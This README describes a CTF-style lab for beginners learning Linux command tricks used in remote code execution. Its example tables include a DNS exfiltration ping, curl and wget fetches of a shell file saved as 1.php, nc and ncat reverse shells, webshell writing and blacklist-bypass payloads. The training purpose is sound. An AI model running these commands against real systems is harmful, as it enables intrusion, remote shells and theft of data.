# RCE-labs

构建一个靶场式学习平台（RCE-labs），通过实战化的CTF挑战关卡，系统性地帮助网络安全初学者理解掌握远程代码执行（RCE）漏洞利用中所需的基础Linux命令和绕过技巧。

![](/assets/1.png)

![](/assets/2.png)

![](/assets/3.png)

![](/assets/4.png)

## 部署

### docker compose（推荐）

```bash
git clone https://github.com/Apursuit/rce-labs.git
cd rce-labs/docker
docker-compose up -d
```

访问 http://ip:8080/

### docker

```bash
docker run -d -p 8080:80 --name rce-lab-latest the0n3/rce-labs:latest
```

访问 http://ip:8080/


## 关卡设计

常用命令 + 绕过技巧（插入新关卡后顺序）

| 关卡 | 关卡描述 | 备注 |
| :--- | :--- | :--- |
| 1 | cat | 读取 |
| 2 | tac | 读取 |
| 3 | head | 读取 |
| 4 | tail | 读取 |
| 5 | more | 读取 |
| 6 | less | 读取 |
| 7 | nl | 读取 |
| 8 | sort | 处理 |
| 9 | uniq | 处理 |
| 10 | dd | 读取/截取 |
| 11 | rev | 字符串/行倒序 |
| 12 | od | 内容查看 |
| 13 | xxd | 内容查看 |
| 14 | hexdump | 内容查看 |
| 15 | base32 | 编码解码 |
| 16 | base64 | 编码解码 |
| 17 | strings | 字符串提取 |
| 18 | grep | 字符串匹配 |
| 19 | file | 报错读取 |
| 20 | date | 报错读取 |
| 21 | diff | 内容对比/侧漏 |
| 22 | find | 文件查找 |
| 23 | cp | 文件复制文件 |
| 24 | mv | 文件移动/重命名 |
| 25 | ping | 外带数据 |
| 26 | curl | 网络请求 |
| 27 | echo | 重定向写文件 |
| 28 | wget | 文件下载 |
| 29 | nc 反弹 shell | 端口监听 |
| 30 | ncat 反弹 shell | 端口监听 |
| 31 | sed 篡改/写入 Webshell | 高级文件操作 |
| 32 | 通配符 ? | 绕过技巧 |
| 33 | 通配符 * | 绕过技巧 |
| 34 | $ 定义变量绕过 | 变量拆分与拼接 |
| 35 | 多命令执行分隔 ; | 绕过技巧 |
| 36 | 多命令执行 && | 绕过技巧 |
| 37 | 多命令执行 || | 绕过技巧 |
| 38 | 反引号优先级 | 绕过技巧 |
| 39 | 绕过注释 # | 绕过技巧 |
| 40 | 绕过空格 \t | 绕过技巧 |
| 41 | 绕过空格 $IFS | 绕过技巧 |
| 42 | 绕过空格 ${IFS} | 绕过技巧 |
| 43 | 绕过空格 bash {,} | 绕过技巧 |
| 44 | 绕过黑名单关键字 ' | 绕过技巧 |
| 45 | 绕过黑名单关键字 " | 绕过技巧 |
| 46 | 绕过黑名单关键字 ? | 绕过技巧 |
| 47 | 绕过黑名单关键字 * | 绕过技巧 |
| 48 | 绕过黑名单关键字 \ | 绕过技巧 |
| 49 | $@ 位置参数绕过 | 绕过技巧 |
| 50 | 绕过黑名单关键字 . | 绕过技巧 |
| 51 | 无回显 RCE | 进阶实战 |


## 我可以学习到什么？


### 命令

Linux 终端的常用命令

| 命令 | 用途 | 示例 |
|---|---|---|
| `ls` | 列出目录/文件 | `ls /` |
| `cat` | 读取文件 | `cat /flag` |
| `tac` | 倒序读取 | `tac /flag` |
| `head`/`tail` | 头/尾部查看 | `head /flag` |
| `more`/`less` | 分页查看 | `less /flag` |
| `nl` | 带行号显示 | `nl /flag` |
| `sort` | 文件内容排序 | `sort /flag` |
| `uniq` | 文件内容去重 | `uniq /flag` |
| `dd` | 截取/复制区块 | `dd if=/flag` |
| `rev` | 行内倒序 | `rev /flag\|rev` |
| `od`/`xxd`/`hexdump` | 二进制转储 | `xxd /flag` |
| `base32`/`base64` | 编解码 | `base64 /flag\|base64 -d` |
| `strings` | 提取可打印串 | `strings /flag` |
| `grep` | 字符串匹配 | `grep . /flag` |
| `file` | 识别文件类型 - 报错泄露文件内容 | `file -f /flag` |
| `date` | 时间/格式化 - 报错泄露文件内容| `a=$(date -f /flag 2>&1);echo $a;` |
| `diff` | 差异比较 | `diff /flag /etc/passwd` |
| `find` | 文件搜索 | `find / -name findme.txt` |
| `cp` | 复制文件/目录 | `cp /flag 1.txt` |
| `mv` | 移动/改名 | `mv flag.php 1.txt` |
| `ping` | 连通性/外带 | ```ping -c `whoami`.dnslog.cn``` |
| `curl` | http请求内容保存为文件 | `curl -o 1.php https://the0n3.top/shell/1.txt` |
| `wget` | 文件下载 | `wget -O 1.php https://the0n3.top/shell/1.txt` |
| `nc` | 反弹shell | `nc x.x.x.x 4444 -e sh` |
| `ncat`| 反弹shell | `ncat x.x.x.x 4444 -c sh`|
| `sed` | 修改文件 | `sed -i 's/匹配内容/新内容/' index.php` |


### 特性

Linux 终端的特性具有简单高效等优点，在 RCE 场景下，往往可以利用这些特性达到绕过过滤、逃逸的目的

| 特性 | 用途 | 示例 |
|---|---|---|
| `?` | 单字符通配 | `cat /f???` |
| `*` | 多字符通配 | `cat /f*` |
| `;` | 多命令分隔 | `id; whoami` |
| `&&` | 前成功再执行后 | `id && whoami` |
| `||` | 前失败再执行后 | `idzzz || whoami` |
| `#` | 注释截断 | `echo -e "id #\nwhoami" > 1.sh;chmod +x 1.sh;./1.sh;` |
| space | 参数分隔 | `ls /` |
| tab(\t) | 用 Tab(%09) 代替空格 | `ls  /` |
| `\t` | 转义的制表符 | `echo -e "a\tb"` |
| `\n` | 换行/多行执行 | `echo -e '111\n222'` |
| `$` | 变量引用/拼接 | `l=l;s=s;$l$s` |
| `${IFS}` | 用分隔符代替空格 | `cat${IFS}/flag` |
| `$IFS` | 分隔符变量 | `cat$IFS/flag` |
| `{cmd,param}` | Bash 花括号展开（生成分词） | `{cat,/flag}` |
| `''` | 单引号（关闭展开/拆分关键字） | `e'c'ho 111` |
| `""` | 双引号（允许变量展开） | `ec""h""o 111` |
| `\` | 转义/拆分关键字 | `e\c\ho 111` |
| `$@` | 位置参数展开 | `e$@ch$@o 111` |


### 无回显 RCE

- 重定向写入 webshell
- 反弹 shell
- 外带（HTTP 请求带出命令执行结果）
- 时间盲注
- 临时文件执行

